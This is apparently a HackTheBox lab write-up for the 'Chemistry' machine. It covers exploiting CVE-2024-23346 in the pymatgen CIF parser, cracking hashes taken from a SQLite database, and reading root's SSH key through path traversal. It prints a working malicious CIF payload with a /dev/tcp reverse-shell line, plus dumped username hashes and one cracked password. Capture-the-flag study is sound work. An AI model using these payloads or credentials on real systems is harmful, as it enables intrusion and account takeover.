---
layout: post
title: "Chemistry"
date: 2024-12-28
author: cotes
categories: [Writeup, HackTheBox]
tags: [HTB, Writeup, Security]
pin: true
math: true
mermaid: true
image:
  path: /assets/img/commons/hackthebox.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hackthebox Image
---


```bash
sudo nmap -sC -sV -T4 -p- -oN nmap 10.129.248.106
```

![[Pasted image 20241020022405.png]]

only port 5000 is open 

the website allow us to upload a CIF file 

![[Pasted image 20241020022634.png]]


after a little bit of googling I found that the CIF file is a files used in some kind of chemistry stuff , I potential library (pymatgen) that can be used in  this kind of stuff .

this library suffer from  #CVE-2024-23346 

https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f

I change the payload of  the file with this 

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c 1 10.10.14.132");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```


after trying to view the file 

![[Pasted image 20241020053514.png]]


getting shell

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i &>/dev/tcp/10.10.14.132/1337 <&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```


![[Pasted image 20241020054408.png]]


I just enumerate the `/home/app` a little bit , and I found an interesting file 
`database.db`

```bash
strings /home/app/instance/database.db

strings /home/app/instance/database.db
SQLite format 3
ytableuseruser
CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(150) NOT NULL,
        password VARCHAR(150) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
indexsqlite_autoindex_user_1user
5tablestructurestructure
CREATE TABLE structure (
        id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        filename VARCHAR(150) NOT NULL,
        identifier VARCHAR(100) NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id),
        UNIQUE (identifier)
indexsqlite_autoindex_structure_1structure
check.cifdcfb4e48-76c1-443b-87a3-21d3d9cb707c3
check.cif7f11548a-b442-4b6f-b380-b92e64dbf21c3
check.cif76578519-aed6-4eb1-b920-16f39e12f2a63
check.cifc70e34f5-26db-4d4f-bc9b-d49b420791643	
check.cif178ff1bf-0ba5-43fe-8e62-87f8a1d2bdaf3
check.cif6a2e39a0-c66c-4114-a4c7-5bce40afe1aa3
shell.cifb3d6de33-c4c3-4b14-b9b9-6a27e2875c073
shell.cif13487916-50e2-4f5c-adec-a3fae1c9e85f1
rce.cif91ba68f0-6258-423a-990a-8320aa5e18481
rce.ciffeed5fc0-cb23-47e1-8fb5-42a93dfb97dd1
rce.ciffd75b664-b324-41c4-b890-abf84ed7756f5
example.cife63baf83-a7df-49b2-969e-521cb945ab6d5
example.cifa3eac938-17c2-48c0-a408-9929c659aa47
dcfb4e48-76c1-443b-87a3-21d3d9cb707c
7f11548a-b442-4b6f-b380-b92e64dbf21c
76578519-aed6-4eb1-b920-16f39e12f2a6
c70e34f5-26db-4d4f-bc9b-d49b42079164
178ff1bf-0ba5-43fe-8e62-87f8a1d2bdaf	(
6a2e39a0-c66c-4114-a4c7-5bce40afe1aa
b3d6de33-c4c3-4b14-b9b9-6a27e2875c07
13487916-50e2-4f5c-adec-a3fae1c9e85f
91ba68f0-6258-423a-990a-8320aa5e1848
feed5fc0-cb23-47e1-8fb5-42a93dfb97dd
fd75b664-b324-41c4-b890-abf84ed7756f
e63baf83-a7df-49b2-969e-521cb945ab6d
U	a3eac938-17c2-48c0-a408-9929c659aa47
Md0s3nta386e70db5d043ce7584bb27512f3114+
Mkristel6896ba7b11a62cacffbdaded457c6d92(
Maxel9347f9724ca083b17e39555c36fd9007*
Mfabian4e5d71f53fdd2eabdbabb233113b5dc0+
Mgelacia4af70c80b68267012ecdac9a7e916d18+
Meusebio6cad48078d0241cca9a7b322ecd073b3)	
Mtaniaa4aa55e816205dc0389591c9f82f43bb,
Mvictoriac3601ad2286a4293868ec2a4bc606ba3)
Mpeter6845c17d298d95aa942127bdad2ceb9b*
Mcarlos9ad48828b0955513f7cf0f7f6510c8f8*
Mjobert3dec299e06f7ed187bac06bd3b670ab2*
Mrobert02fcf7cfc10adc37959fb21f06c6b467(
Mrosa63ed86ee9f624c7b14f1d4f43dc251a5'
Mapp197865e46b878d9e74a0346b6d59886a)
Madmin2861debaf8d99436a10ed6f75a252abf
d0s3nt
kristel
axel
fabian
gelacia
eusebio
tania	
victoria
peter
carlos
jobert
robert
rosa
	admin
```

file contain different hashes , I tried to crack rosa hash since , she's user in the machine

![[Pasted image 20241020054726.png]]

`rosa:unicorniosrosados`

![[Pasted image 20241020054820.png]]

## root

for the root , I found an internal webapp 

```bash
 netstat -ntlp
```

![[Pasted image 20241020055021.png]]

forward it to port 8081 on my own machine
```bash
ssh -L 8081:127.0.0.1:8080  rosa@10.129.17.243
```

![[Pasted image 20241020055115.png]]

![[Pasted image 20241020055223.png]]


after wasting a lot of time , checking crontabs

the app is vulnerable to path traversing on `/assets`

![[Pasted image 20241020055505.png]]


![[Pasted image 20241020055605.png]]


just copy the ssh key to  file 

```bash
chmod 600 root_key
ssh root@10.129.17.243 -i root.key
```

![[Pasted image 20241020055804.png]]